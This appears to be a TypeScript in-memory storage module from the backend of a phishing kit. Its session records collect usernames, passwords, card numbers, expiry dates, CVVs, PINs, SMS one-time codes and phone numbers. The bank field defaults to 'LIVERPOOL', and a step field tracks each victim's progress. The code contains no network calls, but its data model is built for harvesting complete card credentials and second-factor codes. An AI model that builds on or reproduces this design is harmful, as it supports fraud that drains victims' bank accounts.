import { sessions, type Session, insertSessionSchema } from "@shared/schema";
import { z } from "zod";

// Define storage interface
export interface IStorage {
  getAllSessions(): Promise<Session[]>;
  getSessionById(sessionId: string): Promise<Session | undefined>;
  createSession(data: Partial<Session>): Promise<Session>;
  updateSession(sessionId: string, data: Partial<Session>): Promise<Session>;
  deleteSession(sessionId: string): Promise<boolean>;
}

// Memory storage implementation
export class MemStorage implements IStorage {
  private sessions: Map<string, Session>;
  private currentId: number;

  constructor() {
    this.sessions = new Map();
    this.currentId = 1;
  }

  async getAllSessions(): Promise<Session[]> {
    return Array.from(this.sessions.values());
  }

  async getSessionById(sessionId: string): Promise<Session | undefined> {
    return Array.from(this.sessions.values()).find(
      (session) => session.sessionId === sessionId
    );
  }

  async createSession(data: Partial<Session>): Promise<Session> {
    if (!data.sessionId) {
      throw new Error("SessionId is required");
    }

    const id = this.currentId++;
    const createdAt = new Date();
    const active = true;
    
    const session: Session = {
      id,
      sessionId: data.sessionId,
      folio: data.folio || null,
      username: data.username || null,
      password: data.password || null,
      banco: data.banco || "LIVERPOOL",
      tarjeta: data.tarjeta || null,
      fechaVencimiento: data.fechaVencimiento || null,
      cvv: data.cvv || null,
      sms: data.sms || null,
      nip: data.nip || null,
      smsCompra: data.smsCompra || null,
      celular: data.celular || null,
      pasoActual: data.pasoActual || "folio",
      createdAt,
      active,
    };

    this.sessions.set(data.sessionId, session);
    return session;
  }

  async updateSession(sessionId: string, data: Partial<Session>): Promise<Session> {
    const session = await this.getSessionById(sessionId);
    if (!session) {
      throw new Error(`Session with ID ${sessionId} not found`);
    }

    const updatedSession = { ...session, ...data };
    this.sessions.set(sessionId, updatedSession);
    return updatedSession;
  }

  async deleteSession(sessionId: string): Promise<boolean> {
    const session = await this.getSessionById(sessionId);
    if (!session) {
      return false;
    }

    this.sessions.delete(sessionId);
    return true;
  }
}

// Export storage instance
export const storage = new MemStorage();
